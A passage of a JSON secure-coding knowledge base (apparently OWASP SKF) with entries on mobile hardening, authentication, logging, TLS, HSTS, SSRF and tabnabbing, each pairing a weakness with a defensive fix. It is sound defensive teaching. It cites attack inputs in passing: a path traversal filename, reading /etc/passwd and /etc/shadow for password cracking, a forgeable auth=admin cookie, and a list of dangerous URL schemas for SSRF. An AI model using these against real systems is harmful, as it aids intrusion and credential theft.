"Solution": " Disallow screenshots of the application whenever the application is backgrounded  Do not write sensitive information in the applications console, this information is accessible by attackers.  Create a custom window for whenever the application is shown in the ActivityManager, so it does not give away sensitive   information. "
},
{
"kbId": 216,
"title": "Principle of least privilege",
"Description": "The application should always be request minimal permissions for required functionality and resources. This is also known as principle of least privilege. The principle of least privilege  recommends that accounts have the least amount of privilege required to perform their  business processes. This encompasses user rights, resource permissions such as CPU limits,  memory, network, and file system permissions. Whenever the application is compromised by a potential attacker, the attacker does not gain more arbitrary control over the victim''s device ",
"Solution": "Verify that the application is requesting minimal permissions for required functionality and resources."
},
{
"kbId": 217,
"title": "Protecting device memory",
"Description": "When critical functionality is loaded into the device memory and always in the same place and location  then an attacker is able to create a very stable exploit for the application. This can lead to abuse  of the application business logic or stealing of sensitive information. ",
"Solution": "A very good and known and proven technology that can be used is ASLR (Address Space Layout Randomisation). It does this by randomly offsetting the location of modules and certain inmemory structures that will make the developing of exploits much harder. "
},
{
"kbId": 218,
"title": "Enforce anti debugging techniques",
"Description": "An attacker can use debug tooling to find out how the application is working and determain the  possible attack surface by using tooling like GDB or running the application in an emulator.  Using these type of tooling the attacker can learn a lot about the tool and succesfully attack the application and have a higher change of succeeding. ",
"Solution": "The application has to make use of antidebugging techniques that are sufficient enough to  deter or delay likely attackers from injecting debuggers into the application. Also the  application has to be able to notice if it''s runned on an emulator or a specially designed  hardware device that was not intended to be used and to prevent the attacker from gaining  knowledge about the application.  "
},
{
"kbId": 219,
"title": "Protect sensitive activities intents or content providers",
"Description": "The application should never export sensitive activities, intents, or content providers. These activities could than potentially be exploited by third party applications installed on the same device. ",
"Solution": "Identify throughout the application if there are any sensitive activities, intents or  content providers that are being exported. "
},
{
"kbId": 220,
"title": "Mitigate memory dumping attacks",
"Description": "Whenever sensitive information in stored in the devices\u2019 memory, this information can  be dumped by various tool such as \u201candroid debugger (ADB)\u201c on android devices. This  information could give critical information about the application and could aid attackers  in their attacks. ",
"Solution": "Sensitive information maintained in memory must be overwritten with zeros as soon as it  no longer actively used, to mitigate memory dumping attacks.Note:  Whenever the programming language has a garbage collector make sure whenever values are zeroed the GC is also emptied. "
},
{
"kbId": 221,
"title": "Protect agains exported activities or content providers",
"Description": "Whenever input from exported activities intents or content provided is not properly validated this input could potentially exploit vulnerabilities on the mobile application depending on the context in where the input is being used. ",
"Solution": "Input from exported activities, intents or content providers should be validated against  the applications intended operation, i.e if the application expects a field with an integer value, all other incoming data that work out of this intended operation should be logged and rejected by the application. "
},
{
"kbId": 222,
"title": "Block common password and weak passphrases",
"Description": "Applications should encourage the use of strong passwords and passphrases. Preferably the password policy should not put limitations or restrictions on the chosen passwords. Whenever the application supports strong passwords and the use of password managers, the possibility for an attacker performing a succesfull bruteforce attack drops significally.This also increases the possibility that the application can be used with users'' passwords managers. ",
"Solution": "Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent password managers, long passphrases or highly complex passwords being entered. "
},
{
"kbId": 223,
"title": "Application assets hosted on secure location",
"Description": "Whenever application assets such as JavaScript libraries or CSS styleshees are not hosted on the application itself but on a external CDN which is not under your control these CDNs'' can introduce security vulnerabilities. Whenever one of these CDN gets compromised attackers can include malicious scripts. Also whenever one of these CDNs'' get out of service it could affect the operation of the application and even cause a denial of service. ",
"Solution": "Verify that all application assets are hosted by the application, such as JavaScript libraries, CSS stylesheets and web fonts are hosted by the application rather than rely on a CDN or external provider.  "
},
{
"kbId": 224,
"title": "CSRF on REST",
"Description": "CrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site, email, blog, instant message, or program causes a users Web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.The impact of a successful crosssite request forgery attack is limited to the capabilities exposed by the vulnerable application. For example, this attack could result in a transfer of funds, changing a password, or purchasing an item in the users context. In effect, CSRF attacks are used by an attacker to make a target system perform a function (funds Transfer, form submission etc.) via the targets browser without knowledge of the target user at least until the unauthorized function has been committed. ",
"Solution": "REST (REpresentational State Transfer) is a simple stateless architecture that generally runs over HTTPS/TLS. The REST style emphasizes that interactions between clients and services are enhanced by having a limited number of operationsSince the architecture is stateless, the application should make use of sessions or cookies to store the HTTP sessions, which allow associating information with individual visitors. The preferred method for REST services is to utilize tokens for interactive information interchange between the user and the server. By sending this information solely by means of headers, the application is no longer susceptible to CSRF attacks since the CSRF attack utilizes the browsers cookie jar for succesful attacks. "
},
{
"kbId": 225,
"title": "File IO commands",
"Description": "I/O commands allow you to own, use, read from, write to, close devices and To direct I/O  operations to a device. Whenever user supplied input i.e file names and/or file data is being  directly used in these commands, this could lead to path traversal, local file include, file  mime type, and OS command injection vulnerabilities. ",
"Solution": "File names and file contents should be sanitized before being used in I/O commands.  "
},
{
"kbId": 226,
"title": "File upload anti virus check",
"Description": "whenever files from untrusted services are uploaded to the server, there should be additional checks in place to verify whether these files contain viruses (malware, trojans, ransomware).  ",
"Solution": "After uploading the file, the file should be placed in quarantine and antivirus has to  inspect the file for malicious viruses. Antivirus software that has a commandline interface is  requisite for doing such scans. There are also API''s available for other services such as from \"VirusTotal.com\" This site provides a free service in which your file is given as input to  numerous antivirus products and you receive back a detailed report with the evidence resulting from  the scanning process "
},
{
"kbId": 227,
"title": "File upload outside document root",
"Description": "Files that are uploaded by users or other untrusted services should always be placed outside of the document root. This is to prevent malicious files from being parsed by attackers such as PHP/HTML/Javascript files.Should an attacker succeed to bypass file upload restrictions and upload a malicous file, it would be impossible for the attacker to parse these files since they are not located inside of the applications document root. ",
"Solution": "Files should be stored outside of the applications document root. Preferably files should be stored on a seperate file server which serves back and forth to the application server. Files should always be stored outside of the scope of the attacker to prevent files from being parsed or executed.When storing files outside of the document root, take into consideration potential path traversal injections in the applications file name such as \"../html/backtoroot/file.php\". Whenever this filename is being used directly into the path that is used to store files, it could be used to manipulate the storage path. "
},
{
"kbId": 228,
"title": "Authentication integrety checks",
"Description": "Whenever security logs can be modified by unauthorized users, potential attackers could use these privileges to erase and cover their attacks against the application or simply soil the log files. ",
"Solution": "Use host intrusion detection systems (fileintegrity monitoring or changedetection software) on logs to ensure that existing log data or other important files cannot be changed without generating alerts,  depending on the context like a log file then new data being added should not cause an alert. "
},
{
"kbId": 229,
"title": "Unauthorized and unauthenticated access security logs",
"Description": "Security logs should never allow unauthorized/unauthenticated access because these files include a lot of sensitive information and could assist an attacker in leveraging attacks. Whenever these logs can be accessed and modified, attackers could also erase their presence and attack trail they made to the application. ",
"Solution": "The security logs could be protected by means of (HIDS). This is a system that monitors important operating system files to make sure the files can only be accessed by particular users. Security log files could also be protected by the OS itself by defining groups and users and grant only a particular set of users access to the files. "
},
{
"kbId": 230,
"title": "Commonly chosen weak passwords and passphrases",
"Description": "Whenever an attacker has enumerated usernames from an application the attacker could start a bruteforce attack on the authentication functionality. Whenever users have common known weak passwords or passphrases there is a high probability that the attacker can compromise  some of the accounts on the application. ",
"Solution": "The internet is full of top X worst password lists which can be used to verify the users  freshly entered password against. Whenever a user enters a password that matches up to a password provided in one of those lists. The password should be rejected and the user should be advised to take another password. "
},
{
"kbId": 231,
"title": "Two factor authentication",
"Description": "Two factor authenitcation must be implemented to protect your applications users against unauthorized use of the application.Whenever the users username and password are leaked or disclosed by an application on what ever fashion possible, the  users account should still be proteced by two factor authentication mechanisms to prevent attackers from logging in with the credentials.  ",
"Solution": "Multifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism \u2013 typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)Examples of two/multi factor authentication can be 1. Google authenticator    Google Authenticator is an application that implements twostep verification services using the Timebased     Onetime Password Algorithm (TOTP) and HMACbased Onetime Password Algorithm 2. Yubikey  The YubiKey is a hardware authentication device manufactured by Yubico that supports onetime passwords, public key      encryption and authentication, and the Universal 2nd Factor (U2F) protocol[1] developed by the FIDO Alliance (FIDO U2F).   It allows users to securely log into their accounts by emitting onetime passwords or using a FIDObased public/private   key pair generated by the device "
},
{
"kbId": 232,
"title": "Logging access control decisions",
"Description": "Access control decisions must be logged for forensics in the case of brute force attacks.  The logs of the access controls can also help with keeping track of potential session hijacking attacks. Since it can be measured where users logged in from and how many concurrent sessions are active. ",
"Solution": "Verify that all access control decisions can be logged and all failed decisions are logged. "
},
{
"kbId": 233,
"title": "High value transactions",
"Description": "Whenever there are high value transactions a normal username/password static authentication method does not suffice to ensure a high level of security. Whenever the application digests high level of transactions ensure that risk based reauthentication, two factor or transaction signing is in place. ",
"Solution": "1 risk based authentication: In Authentication, riskbased authentication is a nonstatic authentication  system which takes into account the profile of the agent requesting access to  the system to determine the risk profile associated with that transaction. The risk profile is then used to determine the complexity of the challenge. Higher risk profiles leads to stronger challenges, whereas a static username/password may suffice for  lowerrisk profiles. Riskbased implementation allows the application to challenge the user for additional  credentials only when the risk level is appropriate.2 two factor authentication: Multifactor authentication (MFA) is a method of computer access control in which a user is  granted access only after successfully presenting several separate pieces of evidence to an  authentication mechanism \u2013 typically at least two of the following categories: knowledge (something they know),  possession (something they have), and inherence (something they are)3 Transaction signing: Transaction signing (or digital transaction signing) is the process of calculating a keyed hash function  to generate a unique string which can be used to verify both the authenticity and integrity of an online transaction.A keyed hash is a function of the user''s private or secret key and the transaction details,  such as the transfer to the account number and the transfer amount.To provide a high level of assurance of the authenticity and integrity of  the hash it is essential to calculate the hash on a trusted device, such as a separate smart card reader. Calculating a hash on an Internetconnected PC or mobile device such as a mobile telephone/PDA would be counterproductive as malware and attackers can attack these platforms and potentially subvert the signing process itself. "
},
{
"kbId": 234,
"title": "Verify that structured data is strongly typed and validated",
"Description": "Whenever structured data is strongly typed and validated against a defined schema the application can be developed as a defensible proactive application. The application can now measure everything that is outside of its intending operation by means of the defined schema''s and should be used to reject the input if the schema checks return false.  ",
"Solution": "Verify that structured data is strongly typed and validated against a defined schema including allowed characters, length and pattern (e.g. credit card numbers or telephone,  or validating that two related fields are reasonable, such as validating suburbs and zip or  post codes match "
},
{
"kbId": 235,
"title": "Logging guidelines to access sensitive information",
"Description": "Whenever sensitive data is accessed by a user this event should be logged to later verify the integrity of the access to the data. The same principle applies to whenever the data is collected and under which protection directives the data is accessed to.Example: Imagine an insurance company and an accident has happened that is being showed on the news.  Workers of that insurance company must not be able to randomly fill in license plates  they see on the news to find PI about the people having the accident if it is not related to their jobs. I.E, an insurance holder calls the company to file in an accident report.  ",
"Solution": "Verify accessing sensitive data is logged, if the data is collected  under relevant data protection directives or where logging of accesses is required. "
},
{
"kbId": 236,
"title": "Log injection",
"Description": "Log injection problems are a subset of injection problem, in which invalid entries taken from user input are inserted in logs or audit trails, allowing an attacker to mislead administrators or cover traces of an attack. Log injection can also sometimes be used to attack log monitoring systems indirectly by injecting data that monitoring systems will misinterpret.  ",
"Solution": "You should consider these three controls when implementing logging systems. Design: If at all possible, avoid logging data that came from external inputs. Implementation: Ensure that all log entries are statically created, or if they must   record external data that the input is vigorously whitelist checked. Run time: Avoid viewing logs with tools that may interpret control characters in the   file, such as commandline shells.Also verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection. "
},
{
"kbId": 237,
"title": "Validate the integrity of all security relevant configurations",
"Description": "Only authorized administrators should have access to change securityrelevant configurations.These administrators should also regularly check these configurations to be adequate and that they are not unchanged by malicious intent. This could keep systems vulnerable to attacks due to the disabling of important security systems.  ",
"Solution": "Verify that authorised administrators have the capability to verify the integrity of all securityrelevant configurations to ensure that they have not been tampered with.One way to achieve this would be to apply (HIDS) rules.  This is a system that monitors important operating system files and can verify whether these files have been edited. Whenever these files are edited a four eyes principle must be applied that checks the integrity of these changes. "
},
{
"kbId": 238,
"title": "Trusted repositories",
"Description": "Whenever the components are loaded from untrusted repositories this could imply the  components are backdoored, outdated and cannot be trusted. ",
"Solution": "When checking if a repository can be trusted look to see if the source is stil maintained,  security bugs are being reported and mitigated, if the component is not at the end of life or deprecated.You can also scan the component in your SDLC through OWASP dependency checker to see if there are any known CVEs for this component. "
},
{
"kbId": 239,
"title": "Sandboxing malicious code",
"Description": "A sandbox is a security mechanism for separating running programs.  It is often used to execute untested code, or untrusted programs from  unverified thirdparties, suppliers, untrusted users and untrusted websites. It''s creating  an extra layer of security where an attacker first needs to break out from.  ",
"Solution": "Use the sandbox attribute of an iframe for untrusted content. The sandbox attribute of an  iframe enables restrictions on content within an iframe. The following restrictions are Active when the sandbox attribute is set:  All markup is treated as being from a unique origin  All forms and scripts are disabled.   All links are prevented from targeting other browsing contexts   All features that trigger automatically are blocked   All plugins are disabled It is possible to have a finegrained control over iframe capabilities using the value of  the sandbox attribute. In old versions of user agents where this feature is not supported,  this attribute will be ignored. Use this feature as an additional layer of protection or  check if the browser supports sandboxed frames and only show the untrusted  content if supported. Apart from this attribute, to prevent Clickjacking attacks and  unsolicited framing it is encouraged to use the header XFrameOptions which supports  the deny and sameorigin values. Other solutions like framebusting: ```JavaScript if(window!== window.top) { window.top.location = location; }  Only for legacy browser support ``` "
},
{
"kbId": 240,
"title": "Client side constraints",
"Description": "Whenever constraints that are imposed on the client side are not enforced on the server side than these constraints can be easily bypassed by means of an intercepting proxy. i.e whenever user should not  be able to edit a form by solely disabling the input fields, a potential attacker can edit these input  fields on the client side as editable and still submit the form.The same principle goes for whenever certain parts of the application should be inaccessible. Simply hiding the pages from the presentation layer is insecure since the attacker can enumerate by brute forcing or fuzzing himself into different pages. Again the access controls should be enforced also on the server side.   ",
"Solution": "All critical decision making logic must be enforced on the server side out of the scope of a potential  attacker. Client side constraints can be easily bypassed. "
},
{
"kbId": 241,
"title": "Context sensitive authorization",
"Description": "Whenever granting users different types of authorization throughout the application the authorization grants should be granted and enforced outside of the attackers scope.i.e whenever a user gets his authorization grants through a cookie that says,````     auth=admin or auth=user ````These authorization grants are easily manipulable.  ",
"Solution": "Authorization grants must be granted and enforced outside of the attackers scope. i.e:  The user logs into the application, the user id is then stored in a local variable. The application stores grants(privileges/attributes/claims) in the database and for each function the user calls the application gets the grants from the DB using the local variable and checks if the user has access to this function. "
},
{
"kbId": 242,
"title": "All access controls must fail securely",
"Description": "Handling errors securely is a key aspect of secure coding. There are two types of errors that deserve special attention. The first is exceptions that occur in the processing of a security control itself. It''s important that these exceptions do not enable behavior that the countermeasure would normally not allow. As a developer, you should consider that there are generally three possible outcomes from a security mechanism:1. allow the operation 2. disallow the operation 3. exceptionIn general, you should design your security mechanism so that a failure will follow the same execution path as disabling the operation ",
"Solution": "Make sure all the access control systems are thoroughly tested for failing securely before using it in your application. It is common that complete unittest are created especially for this purpose. "
},
{
"kbId": 243,
"title": "Password leakage",
"Description": "After completing a password recovery functionality, the user should not be sent a plaintext password to his email adress. The application should also under no circumstances disclose the old or current password to the users. ",
"Solution": "The application should under no circumstances disclose the users current, old and new password plain text. This behavior makes the application susceptible to side channel attacks and make the passwords lose their integrity since they could be compromised by someone looking over another users shoulder to see the password.  "
},
{
"kbId": 244,
"title": "TLS implementation",
"Description": "Whenever sensitive information is being sent over the application TLS must be applied in the application to prevent malicious attackers eavesdropping the network can look into and manipulate this sensitive information.  ",
"Solution": "Verify that TLS is used for all connections (including both external and backend connections)  that are authenticated or that involve sensitive data or functions, and does not fall back to insecure or unencrypted protocols. Ensure the strongest alternative is the preferred algorithm.As modern cryptography relies on being computationally expensive to break, specific standards can be set for key sizes that will provide assurance that with today\u2019s technology and understanding, it will take too long to decrypt a message by attempting all possible keys.Therefore, we need to ensure that both the algorithm and the key size are taken into account when selecting an algorithm. Whenever computer power increases the standards for selecting a new alogrithm changes as well. "
},
{
"kbId": 245,
"title": "Screen scraping data harvest",
"Description": "Whenever the application does not put a threshold on the number requests made to the server, screen scraping and data harvesting tools can gather data and information.i.e should the application contain an insecure direct object reference, then the data harvesting tool could now harvest information it was not originally authorized to access to.Or the application is a web shop and the competition is scraping prices and products in order to  give them an edge on comparison websites and get more business. ",
"Solution": "ModSecurity can be used to set up rules to prevent attackers from scraping and harvesting data from the application. The ModSecurity can be set up with thresholds and rate limiting and block IP adresses if they exceed the threshold. "
},
{
"kbId": 246,
"title": "Communication between components (low privileges)",
"Description": "If accounts for communicating between components have granted more privileges than necessary, these accounts could impose a great threat whenever one of these components gets compromised by attackers. i.e: A web application running on root privileges which has a path traversal vulnerability can be used to read both the \"etc/passwd\" file as well as reading the \"etc/shadow\" file.These files can then be used in an offline password cracking attacks to recover accounts on the server. ",
"Solution": "Communications between components, such as between the application server and the database  server should be authenticated using an account with the least necessary privileges. "
},
{
"kbId": 247,
"title": "TLS settings are in line with current leading practice",
"Description": "TLS settings must always be in line with current leading practice. Whenever TLS settings and ciphers get outdated, the TLS connection can be degraded/broken and used by attackers to eavesdrop on users traffic over the application. ",
"Solution": "There should be structural scans that are done regularly against the applications TLS settings and configurations to check whether the TLS settings are in line with current leading practice.This could be achieved by using the SSLLabs api or the OWASP OSaft project.OSaft is an easy to use tool to show informations about SSL certificate and tests the SSL  connection according to a given list of ciphers and various SSL configurations.It''s designed to be used by penetration testers, security auditors or server administrators.  The idea is to show the important information or the special checks with a simple call of the tool. However, it provides a wide range of options so that it can be used for comprehensive and special  checks by experienced people.While doing these tests also take into consideration the following configuration on the server side:Verify that old versions of SSL and TLS protocols, algorithms, ciphers, and configuration are  disabled, such as SSLv2, SSLv3, or TLS 1.0 and TLS 1.1. The latest version of TLS should be the  preferred cipher suite."
},
{
"kbId": 248,
"title": "Data retention policy",
"Description": "For all the data gathered in an application, there should be set up a data retention policy to make sure all the data is removed from the application when it is no longer used. This reduces the damage done by potential attackers when they get access to the applications data due to a breach. ",
"Solution": "All the sensitive information within the application must be mapped along with the  timeframe it is necessary to store this data on the application. For each data set it must be determined how to effectively clear this information from the application."
},
{
"kbId": 249,
"title": "Authenticated data cleared from client storage",
"Description": "All authenticated data should be removed from the browsers storage as soon as the session is terminated. This reduces the possibility that a potential attacker gains sensitive authenticated information whenever the application is attacked.This approach also is necessary to disable unauthenticated users to access the information if the user was initially logged in on a public computer. ",
"Solution": "Whenever the user terminates his session all sensitive authenticated information should be  cleared from the browser in the client storage. such as:* local storage * Session storage * web SQL * Cache storage * Application cache * etc "
},
{
"kbId": 250,
"title": "All error handling logic must fail securely",
"Description": "Handling errors securely is a key aspect of secure coding. There are two types of errors that deserve special attention. The first is exceptions that occur in the processing of a security control itself. It''s important that these exceptions do not enable behavior that the countermeasure would normally not allow. As a developer, you should consider that there are generally three possible outcomes from a security mechanism:1. Allow the operation 2. Disallow the operation 3. ExceptionIn general, you should design your security mechanism so that a failure will follow the same execution path as disabling the operation ",
"Solution": "Make sure all the error handling logic is thoroughly tested for failing securely before using it in your application. It is common that complete unittest are created especially for this purpose. "
},
{
"kbId": 251,
"title": "Sensitive information in code or online repositories",
"Description": "Whenever secrets, API keys, and passwords are stored in the applications source code an attacker can potentially retrieve this sensitive information by i.e:1. Finding old zip files with earlier releases 2. Retrieve and read files by path traversal attacksAlso be cautious not to store this sensitive information on online repositories. Whenever this repository gets made public by accident or compromised all this sensitive information can fall into the hands of attackers. ",
"Solution": "Verify that secrets, API keys, and passwords are not included in the source code, or online source code  repositories.This could be achieved by manual code reviews and potentially small tools that checks the code for these keys and secrets by means of pattern matching. "
},
{
"kbId": 252,
"title": "Identify all components",
"Description": "Components are defined in terms of the business functions and/or security functions they provide. It is easier for forensics to do their investigations whenever a breach has happened on an application.These insights also help whenever an update or release is made on the application to determine what security risks are effectively covered by the security functions.  ",
"Solution": "Verify that all application components are defined in terms of the business functions and/or security functions they provide. "
},
{
"kbId": 253,
"title": "Display concurrent and active sessions",
"Description": "Whenever the user is presented a summary of all concurrent sessions, this decreases a potentially succesful hijacking attack since the user can now see all sessions and terminate one whenever it does not feel trusted. ",
"Solution": "The user should be presented with all concurrent and active sessions in his profile/account  summary. This way the user can keep track of what is happening and can choose to terminate a  session whenever it feels untrusted. Whenever the user shared permission to other applications by means of for example OAuth, than the user should also be presented that have shared permissions along with the type of permissions  and activation date."
},
{
"kbId": 254,
"title": "Password change leads to destroying concurrent sessions",
"Description": "Whenever a user changes his password, the user should be granted the option to kill all other concurrent sessions. This countermessure helps to exclude potential attackers living on a hijacked session.Note: Whenever users are granted the possibility to change their passwords,       do not forget to make them reauthenticate or to use a form of step up       or adaptive authentication mechanism. ",
"Solution": "Verify the user is prompted with the option to terminate all other active sessions  after a successful change password process. "
},
{
"kbId": 255,
"title": "HSTS preload",
"Description": "HTTP Strict Transport Security (HSTS) is an optin security enhancement that is specified by a  web application through the use of a special response header. Once a supported browser receives  this header that browser will prevent any communications from being sent over HTTP to the specified  domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.However, there is still a window where a user who has a fresh install, or who wipes out their local state, is vulnerable. This is due to the fact that the browser is not yet aware of the fact if the application is trying to connect to supports HSTS. Whenever you are added to the preload list, the application its preference is hardcoded into the browser and all first initial connections will always be made by HTTPS. ",
"Solution": "In order to request for HSTS preloading, there are some requirements the application has to  be complient with. The submission for the HSTS preloading can be performed on the following url:    https://hstspreload.org/Submission RequirementsIf a site sends the preload directive in an HSTS header, it is considered to be requesting  inclusion in the preload list and may be submitted via the form on this site.In order to be accepted to the HSTS preload list the site must satisfy the following set of requirements:1. Serve a valid certificate. 2. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80. 3. Serve all subdomains over HTTPS.     In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists. 5. Serve an HSTS header on the base domain for HTTPS requests:     The maxage must be at least eighteen weeks (10886400 seconds).     The includeSubDomains directive must be specified.     The preload directive must be specified.     If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS      header (rather than the page it redirects to).Now the following parameter can be added to the HSTS header,maintained by Chrome (and used by Firefox and Safari), then use:     StrictTransportSecurity: maxage=31536000; includeSubDomains; preloadThe ''preload'' flag indicates the site owner''s consent to have their domain preloaded. The site owner still needs to then go and submit the domain to the list. CAUTION:Make sure to have a perfectly smooth certification management. Whenever there is no valid certificate, the application can not be downgraded temporarily over HTTP. The failing of the TLS certificate will lead to a DOS since HSTS does not allow the application to be visited over HTTP "
},
{
"kbId": 256,
"title": "Integrity check and authorised modification",
"Description": "The Current state of the data or program should be compared to the previous recorded in order to detect changes. Throughout the development of the application, there must be perpetual checks in place to check if all  pages and resources by default require authentication except those specifically intended to be public. Sometimes developers simply forget to implement these checks, or they remove the checks temporarily  for testing purposes.  ",
"Solution": "Verify all access controls are implemented properly in order to prevent a user access data/functions which  he was not intended to use. "
},
{
"kbId": 257,
"title": "Unauthorised access and modification",
"Description": "Throughout the development of the application there must be perpetual checks in place to check if all pages and resources by default require authentication except those specifically intended to be public.Sometimes developers simply forget to implement these checks, or they remove the checks  temporarily for testing purposes.   ",
"Solution": "Verify all access controls are implemented properly in order to prevent a user access data/functions which  he was not intended to use. "
},
{
"kbId": 258,
"title": "Identify and use only require functions if using components",
"Description": "Applications have many different components that are needed for the business functions  or for the security functions they provide. With many different components, there are also possible vulnerabilities that can arise. Also, most of the components functions  that are delivered are not necessary needed and can introduce a vulnerability in a specific part that may not be even used by the application. Also, these security issues in the components  are publicly well know and documented.  ",
"Solution": "The best approach in minimizing the possible security issues that can arise in application  components and identify the required functions and disable or remove those that are not needed by the application business functions or security functions. This way there is a lower risk when using those components and easier to maintain and protecting the application. "
},
{
"kbId": 259,
"title": "Centralized the mechanisms for protecting resources and the access",
"Description": "Applications have often different ways for granting access to protected resources, sometimes these are  done based on a role that is defined in a Database or using an Active Directory permission. Also, external authorization services may be implemented and needed for the application. With all these different ways  for protecting resources and the access to these assets mistakes will be easily made.  ",
"Solution": "Immplement a centralized mechanism where all the different types of resources and grating access to  these resources (including libraries that call external authorization services) are located. This way it''s easier to maintain and the lower the complexity.This centralized solution should also contain sufficient logging and monitoring to detect account abuse or breaches. "
},
{
"kbId": 260,
"title": "Third party components",
"Description": " All third party components the application depends on to operate must be mapped in terms of the functions, and/or security functions, they provide for several reasons.1. Whenever one of these dependencies is down the application has to handle the missing of    that dependency gracefully and not break down resulting in a DOS.2. All security functions they provide must be mapped and backed up by a WAF or ModSecurity in case    the dependency goes down for service. ",
"Solution": "Verify that all components that are not part of the application but that the application relies on to operate are defined in terms of the functions, and/or security functions, they provide. "
},
{
"kbId": 261,
"title": "Policy for processing sensitive data",
"Description": " Some data on an application can be consider sensitive due to its importance:  Social security number  Credit card or banking information Or by the context of the information:  Passphrase used as a password of an application  University restricted or critical dataOn applications, data considered sensitive should be kept safe. The way we secure the data could be defined by us, but some information it should be made according to a standard  i.e. all applications that manipulate credit card information should comply with one of the pci standards.  ",
"Solution": "Identify the list of sensitive data that is being processed by the application.Establish, maintain, and disseminate a security policy for processing and storing sensitive data. If information should be encrypted, separated in another database, etc. If exist, follow the appropriate standard. "
},
{
"kbId": 262,
"title": "Server side request forgery",
"Description": "Server Side Request Forgery (SSRF) attack, where an attacker abuse the functionality of a vulnerable web application to send crafter request which which read or update internal  resources. Attacker can attack an internal network or application behind the firewall with this attack which is normally not accessible through external network and even attack the internal network web applications.SSRF attack can be used to make requests to other internal resources for accessing the  metadata and to run a port can on the internal network. URL schema such as file:// can be used to read the file from the server. Attackers can use legacy URL schemas such as  dict, gopher, expect etc which can even cause remote code execution. ",
"Solution": "Disable unused URL schemas which are dangerous like expect://, file:///, ftp://, gopher://. Proper whitelisting of domain or IP address which you need to access to. Response received from  the internal server should not be shown to the attacker. Some services like Memcached, Redis, Elasticsearch and MongoDB do not require authentication by default, so we need to enable  authentication for these services. "
},
{
"kbId": 263,
"title": "ASVS",
"Description": "The OWASP Application Security Verification Standard (ASVS) Project provides a basis for testing web application technical security controls and also provides developers with a list of requirements for secure development.The primary aim of the OWASP Application Security Verification Standard (ASVS) Project is to normalize the range in the coverage and level of rigor available in the market when it comes to performing Web application security verification using a commerciallyworkable open standard. The standard provides a basis for testing application technical security controls, as well as any technical security controls in the environment, that are relied on to protect against vulnerabilities such as CrossSite Scripting (XSS) and SQL injection. This standard can be used to establish a level of confidence in the security of Web applications. The requirements were developed with the following objectives in mind:Use as a metric  Provide application developers and application owners with a yardstick with which to assess the degree of trust that can be placed in their Web applications, Use as guidance  Provide guidance to security control developers as to what to build into security controls in order to satisfy application security requirements, and Use during procurement  Provide a basis for specifying application security verification requirements in contracts. ",
"Solution": "Check out the OWASPASVS checklist in the OWASPSKF application or download the PDF version of ASVS here: https://www.owasp.org/images/3/33/OWASP_Application_Security_Verification_Standard_3.0.1.pdf "
},
{
"kbId": 264,
"title": "MASVS",
"Description": " The OWASP Mobile App Security and Verification (MASVS) Project provides a basis for testing mobile application technical security controls and also provides developers with a list of requirements for secure development. It can be used by mobile software architects and developers seeking to develop secure mobile applications, as well as security testers to ensure completeness and consistency of test results. The requirements were developed with the following objectives in mind:Use as a metric  Provide developers and application owners with a yardstick with which to assess the degree of trust that can be placed in their mobile applications, Use as guidance  Provide guidance to security control developers as to what to build into security controls in order to satisfy application security requirements, and Use during procurement  Provide a basis for specifying application security verification requirements in contracts. ",
"Solution": "Check out the OWASPMASVS checklist in the OWASPSKF application or download the PDF version of MASVS here: https://github.com/OWASP/owaspmasvs/releases/download/1.0/OWASP_Mobile_AppSec_Verification_Standard_v1.0.pdf "
},
{
"kbId": 265,
"title": "PCI DSS",
"Description": " The Payment Card Industry Data Security Standard (PCI DSS) applies to companies of any size that accept credit card payments. If your company intends to accept card payment, and store, process and transmit cardholder data, you need to host your data securely with a PCI compliant hosting provider. PCI DSS 12 requirements is a set of security controls that businesses are required to implement to protect credit card data and comply with the Payment Card Industry Data Security Standard (PCI DSS). The requirements were developed and are maintained by the Payment Card Industry (PCI) Security Standards Council.  ",
"Solution": "Check out the PCIDSS requirements here: https://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss "
},
{
"kbId": 266,
"title": "Tabnabbing",
"Description": "Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page,  for example to replace it with a phishing site. As the user was originally on the correct page they are  less likely to notice that it has been changed to a phishing site, especially it the site looks the same as the target.  If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.As well as the target site being able to overwrite the target page, any http link can be spoofed to overwrite the target  page if the user is on an unsecured network, for example a public wifi hotspot. The attack is possible even if the target  site is only available via https as the attacker only needs to spoof the http site that is being linked to. ",
"Solution": "To prevent this issue the following actions are available:Cut the back link between the parent and the child pages:   For html link:    * To cut this back link then add the attribute rel=\"noopener\" on the       tag used to create the link from the parent page to the child page.       This attribute value cut the link but, depending on the browser, let referrer      information be present in the request to the child page.    * To remove also the referrer information then use this attribute value: rel=\"noopener noreferrer\".   For javascript window.open function, add the values noopener,noreferrer in the windowFeatures parameter of the window.open function.As the behavior using the elements above is different between the browsers either using html  link or javascript to open a window (or tab) then use this configuration to maximize the cross supports:* For html link, add the attribute rel=\"noopener noreferrer\" for every links. * For Javascript, use this function to open a window (or tab):  function openPopup(url, name, windowFeatures){     //Open the popup and set the opener and referrer policy instruction     var newWindow = window.open(url, name, ''noopener,noreferrer,'' + windowFeatures);     //Reset the opener link     newWindow.opener = null;   }    Add the HTTP response header ReferrerPolicy: noreferrer the every HTTP responses send by the application (Header ReferrerPolicy information). This configuration will ensure that no referrer information is sent along with requests from page. "
},
{
"kbId": 267,
"title": "Server side template injection",
"Description": "Whenever user supplied input is embeded directly into a template when the application makes use of a templeating engine (jinja2, twig, Freemarker), a malicious attacker can inject  and execute template expressions. More often the injection of template expressions will ultimately  lead to RCE vulnerabilities.This type of vulnerability is also seen a lot through applications that let the user intentionally modify the template to provide users a more flexible way to style the applications pages like a wiki page or CMS system. ",
